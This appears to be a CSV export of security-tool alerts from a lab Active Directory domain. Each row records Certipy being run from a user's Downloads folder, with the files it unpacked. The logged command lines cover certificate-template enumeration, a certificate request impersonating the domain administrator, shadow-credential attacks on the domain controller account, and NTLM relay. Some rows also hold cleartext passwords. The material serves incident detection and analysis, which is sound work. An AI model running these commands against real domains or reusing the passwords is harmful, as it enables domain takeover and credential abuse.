"timestamp","Host","severity_name","severity","description","cmdline","files_written","entities"
"2025-03-28T10:35:24.532Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" req -username alice -password REDACTED -ca PLUMETECH-DC1-CA -target 10.0.1.11 -template KerberosAuthentication -upn administrator@plumetech.local -dns 10.0.1.11","@{filename=api-ms-win-core-timezone-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91922; timestamp=1743158126},@{filename=api-ms-win-core-errorhandling-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91922; timestamp=1743158125},@{filename=api-ms-win-core-util-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91922; timestamp=1743158126},@{filename=api-ms-win-crt-runtime-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91922; timestamp=1743158126},@{filename=api-ms-win-core-datetime-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91922; timestamp=1743158125},@{filename=api-ms-win-core-string-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91922; timestamp=1743158125},@{filename=libffi-7.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91922; timestamp=1743158126},@{filename=api-ms-win-crt-heap-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91922; timestamp=1743158126},@{filename=api-ms-win-crt-locale-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91922; timestamp=1743158126},@{filename=api-ms-win-core-heap-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91922; timestamp=1743158125}",
"2025-03-28T10:34:51.302Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" req -username frank -password REDACTED -ca PLUMETECH-DC1-CA -target 10.0.1.11 -template KerberosAuthentication -upn administrator@plumetech.local -dns 10.0.1.11","@{filename=api-ms-win-core-libraryloader-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI73802; timestamp=1743158092},@{filename=pythoncom310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI73802; timestamp=1743158093},@{filename=api-ms-win-core-console-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI73802; timestamp=1743158092},@{filename=api-ms-win-core-processthreads-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI73802; timestamp=1743158092},@{filename=api-ms-win-crt-heap-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI73802; timestamp=1743158092},@{filename=api-ms-win-core-datetime-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI73802; timestamp=1743158092},@{filename=api-ms-win-core-processenvironment-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI73802; timestamp=1743158092},@{filename=api-ms-win-core-namedpipe-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI73802; timestamp=1743158092},@{filename=api-ms-win-crt-time-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI73802; timestamp=1743158092},@{filename=libssl-1_1.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI73802; timestamp=1743158092}",
"2025-03-28T10:34:08.752Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" shadow auto -u martin -p M!<r0$0fT1 -account DC1","@{filename=VCRUNTIME140.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI63322; timestamp=1743158049},@{filename=api-ms-win-core-heap-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI63322; timestamp=1743158050},@{filename=api-ms-win-core-util-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI63322; timestamp=1743158050},@{filename=libffi-7.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI63322; timestamp=1743158050},@{filename=libssl-1_1.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI63322; timestamp=1743158050},@{filename=ucrtbase.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI63322; timestamp=1743158051},@{filename=api-ms-win-core-console-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI63322; timestamp=1743158049},@{filename=api-ms-win-core-interlocked-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI63322; timestamp=1743158050},@{filename=api-ms-win-core-processthreads-l1-1-1.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI63322; timestamp=1743158050},@{filename=api-ms-win-core-localization-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI63322; timestamp=1743158050}",
"2025-03-28T10:33:50.742Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" shadow auto -u martin -p M!<r0$0fT1 -account DC1$","@{filename=api-ms-win-crt-time-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72722; timestamp=1743158032},@{filename=api-ms-win-core-profile-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72722; timestamp=1743158032},@{filename=api-ms-win-core-util-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72722; timestamp=1743158032},@{filename=api-ms-win-core-processthreads-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72722; timestamp=1743158032},@{filename=libcrypto-1_1.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72722; timestamp=1743158032},@{filename=api-ms-win-core-fibers-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72722; timestamp=1743158031},@{filename=api-ms-win-core-localization-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72722; timestamp=1743158032},@{filename=api-ms-win-crt-heap-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72722; timestamp=1743158032},@{filename=api-ms-win-crt-locale-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72722; timestamp=1743158032},@{filename=api-ms-win-crt-conio-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72722; timestamp=1743158032}",
"2025-03-28T10:33:02.308Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" find -username alice -p Demo@123 -target 10.0.1.11","@{filename=api-ms-win-crt-process-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91082; timestamp=1743157983},@{filename=pythoncom310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91082; timestamp=1743157984},@{filename=api-ms-win-core-rtlsupport-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91082; timestamp=1743157983},@{filename=api-ms-win-crt-utility-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91082; timestamp=1743157983},@{filename=api-ms-win-crt-runtime-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91082; timestamp=1743157983},@{filename=api-ms-win-crt-heap-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91082; timestamp=1743157983},@{filename=api-ms-win-crt-filesystem-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91082; timestamp=1743157983},@{filename=api-ms-win-core-profile-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91082; timestamp=1743157983},@{filename=api-ms-win-core-file-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91082; timestamp=1743157983},@{filename=api-ms-win-crt-time-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI91082; timestamp=1743157983}",
"2025-03-28T10:33:00.253Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" shadow auto -u PLUMETECH.LOCAL\martin -p M!<r0$0fT1 -account DC1$","@{filename=api-ms-win-core-synch-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI102522; timestamp=1743157981},@{filename=api-ms-win-crt-process-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI102522; timestamp=1743157981},@{filename=api-ms-win-core-localization-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI102522; timestamp=1743157981},@{filename=api-ms-win-crt-convert-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI102522; timestamp=1743157981},@{filename=api-ms-win-core-synch-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI102522; timestamp=1743157981},@{filename=api-ms-win-crt-multibyte-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI102522; timestamp=1743157981},@{filename=api-ms-win-core-errorhandling-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI102522; timestamp=1743157981},@{filename=mfc140u.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI102522; timestamp=1743157982},@{filename=pywintypes310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI102522; timestamp=1743157982},@{filename=ucrtbase.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI102522; timestamp=1743157982}",
"2025-03-28T10:32:43.296Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" shadow auto -u PLUMETECH.LOCAL\martin: -p M!<r0$0fT1 -account DC1$","@{filename=api-ms-win-core-errorhandling-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI73962; timestamp=1743157964},@{filename=api-ms-win-crt-utility-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI73962; timestamp=1743157965},@{filename=api-ms-win-core-util-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI73962; timestamp=1743157965},@{filename=api-ms-win-core-profile-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI73962; timestamp=1743157964},@{filename=libffi-7.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI73962; timestamp=1743157965},@{filename=api-ms-win-core-processthreads-l1-1-1.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI73962; timestamp=1743157964},@{filename=api-ms-win-crt-string-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI73962; timestamp=1743157965},@{filename=api-ms-win-core-file-l2-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI73962; timestamp=1743157964},@{filename=api-ms-win-crt-time-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI73962; timestamp=1743157965},@{filename=api-ms-win-core-console-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI73962; timestamp=1743157964}",
"2025-03-28T10:32:31.157Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" find vulnerable -username alice -p Demo@123 -target 10.0.1.11","@{filename=api-ms-win-core-handle-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI82882; timestamp=1743157952},@{filename=api-ms-win-core-interlocked-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI82882; timestamp=1743157952},@{filename=mfc140u.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI82882; timestamp=1743157953},@{filename=api-ms-win-core-libraryloader-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI82882; timestamp=1743157952},@{filename=api-ms-win-crt-stdio-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI82882; timestamp=1743157952},@{filename=api-ms-win-core-datetime-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI82882; timestamp=1743157952},@{filename=api-ms-win-core-timezone-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI82882; timestamp=1743157952},@{filename=libffi-7.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI82882; timestamp=1743157953},@{filename=api-ms-win-core-namedpipe-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI82882; timestamp=1743157952},@{filename=api-ms-win-core-processthreads-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI82882; timestamp=1743157952}",
"2025-03-28T10:32:25.759Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" shadow auto -u PLUMETECH.LOCAL\martin: -p M!<r0 -account DC1$","@{filename=api-ms-win-core-rtlsupport-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103202; timestamp=1743157947},@{filename=api-ms-win-core-timezone-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103202; timestamp=1743157947},@{filename=api-ms-win-crt-heap-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103202; timestamp=1743157947},@{filename=python310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103202; timestamp=1743157947},@{filename=api-ms-win-core-util-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103202; timestamp=1743157947},@{filename=pythoncom310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103202; timestamp=1743157947},@{filename=api-ms-win-core-synch-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103202; timestamp=1743157947},@{filename=api-ms-win-core-processthreads-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103202; timestamp=1743157947},@{filename=api-ms-win-core-synch-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103202; timestamp=1743157947},@{filename=api-ms-win-crt-filesystem-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI103202; timestamp=1743157947}",
"2025-03-28T10:31:56.84Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" find -username alice -p Demo@123 -target 10.0.1.11","@{filename=api-ms-win-crt-conio-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI21562; timestamp=1743157917},@{filename=api-ms-win-crt-math-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI21562; timestamp=1743157918},@{filename=libcrypto-1_1.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI21562; timestamp=1743157918},@{filename=api-ms-win-crt-multibyte-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI21562; timestamp=1743157918},@{filename=api-ms-win-core-interlocked-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI21562; timestamp=1743157917},@{filename=api-ms-win-crt-string-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI21562; timestamp=1743157918},@{filename=api-ms-win-core-fibers-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI21562; timestamp=1743157917},@{filename=api-ms-win-crt-process-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI21562; timestamp=1743157918},@{filename=api-ms-win-core-file-l2-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI21562; timestamp=1743157917},@{filename=VCRUNTIME140.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI21562; timestamp=1743157917}",
"2025-03-28T10:24:37.913Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" relay -target http://dc1.plumetech.local -template Smartcard","@{filename=api-ms-win-core-fibers-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI77642; timestamp=1743157478},@{filename=python310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI77642; timestamp=1743157479},@{filename=api-ms-win-core-debug-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI77642; timestamp=1743157478},@{filename=api-ms-win-core-namedpipe-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI77642; timestamp=1743157478},@{filename=pythoncom310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI77642; timestamp=1743157479},@{filename=api-ms-win-crt-locale-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI77642; timestamp=1743157478},@{filename=api-ms-win-core-file-l2-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI77642; timestamp=1743157478},@{filename=pywintypes310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI77642; timestamp=1743157479},@{filename=api-ms-win-core-util-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI77642; timestamp=1743157478},@{filename=libffi-7.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI77642; timestamp=1743157479}",
"2025-03-28T10:24:16.13Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" relay -target http://dc1.plumetech.local -h","@{filename=mfc140u.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72522; timestamp=1743157457},@{filename=api-ms-win-core-handle-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72522; timestamp=1743157457},@{filename=api-ms-win-crt-string-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72522; timestamp=1743157457},@{filename=api-ms-win-crt-environment-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72522; timestamp=1743157457},@{filename=api-ms-win-core-processthreads-l1-1-1.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72522; timestamp=1743157457},@{filename=api-ms-win-core-interlocked-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72522; timestamp=1743157457},@{filename=api-ms-win-core-heap-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72522; timestamp=1743157457},@{filename=api-ms-win-core-errorhandling-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72522; timestamp=1743157457},@{filename=api-ms-win-core-debug-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72522; timestamp=1743157457},@{filename=api-ms-win-crt-utility-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72522; timestamp=1743157457}",
"2025-03-28T10:23:21.031Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" relay -target http://10.0.1.11","@{filename=tcl86t.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93802; timestamp=1743157403},@{filename=api-ms-win-core-processthreads-l1-1-1.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93802; timestamp=1743157402},@{filename=api-ms-win-core-file-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93802; timestamp=1743157402},@{filename=api-ms-win-crt-convert-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93802; timestamp=1743157402},@{filename=api-ms-win-crt-stdio-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93802; timestamp=1743157402},@{filename=api-ms-win-crt-multibyte-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93802; timestamp=1743157402},@{filename=api-ms-win-core-debug-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93802; timestamp=1743157402},@{filename=api-ms-win-core-rtlsupport-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93802; timestamp=1743157402},@{filename=api-ms-win-crt-locale-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93802; timestamp=1743157402},@{filename=api-ms-win-crt-time-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI93802; timestamp=1743157402}",
"2025-03-28T10:23:03.624Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" relay http://10.0.1.11 -target 10.0.1.11","@{filename=VCRUNTIME140.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI13122; timestamp=1743157384},@{filename=api-ms-win-crt-conio-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI13122; timestamp=1743157384},@{filename=api-ms-win-crt-time-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI13122; timestamp=1743157384},@{filename=api-ms-win-core-processthreads-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI13122; timestamp=1743157384},@{filename=python310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI13122; timestamp=1743157385},@{filename=api-ms-win-core-profile-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI13122; timestamp=1743157384},@{filename=api-ms-win-core-util-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI13122; timestamp=1743157384},@{filename=api-ms-win-core-string-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI13122; timestamp=1743157384},@{filename=api-ms-win-core-debug-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI13122; timestamp=1743157384},@{filename=api-ms-win-crt-string-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI13122; timestamp=1743157384}",
"2025-03-28T10:22:48.665Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" relay http://10.0.1.11","@{filename=api-ms-win-crt-locale-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72842; timestamp=1743157369},@{filename=libffi-7.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72842; timestamp=1743157370},@{filename=libssl-1_1.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72842; timestamp=1743157370},@{filename=api-ms-win-core-errorhandling-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72842; timestamp=1743157369},@{filename=python3.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72842; timestamp=1743157370},@{filename=api-ms-win-crt-math-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72842; timestamp=1743157369},@{filename=api-ms-win-core-rtlsupport-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72842; timestamp=1743157369},@{filename=api-ms-win-core-file-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72842; timestamp=1743157369},@{filename=api-ms-win-crt-convert-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72842; timestamp=1743157369},@{filename=pywintypes310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI72842; timestamp=1743157370}",
